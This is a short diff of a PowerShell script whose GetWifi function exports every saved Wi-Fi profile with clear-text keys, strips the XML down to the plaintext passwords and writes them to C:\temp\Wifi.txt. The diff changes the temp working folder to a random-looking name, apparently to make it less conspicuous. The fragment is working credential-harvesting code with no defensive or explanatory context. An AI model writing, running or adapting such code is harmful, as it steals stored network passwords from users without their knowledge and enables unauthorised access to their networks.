@@ -9,8 +9,8 @@ function GetVersion {
 
 
 function GetWifi {
-   New-Item -Path $env:temp -Name "8ad3rror" -ItemType "directory"
-   Set-Location -Path "$env:temp/8ad3rror"; netsh wlan export profile key=clear
+   New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"
+   Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear
    Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} | Out-File "C:\temp\Wifi.txt"
 }
 
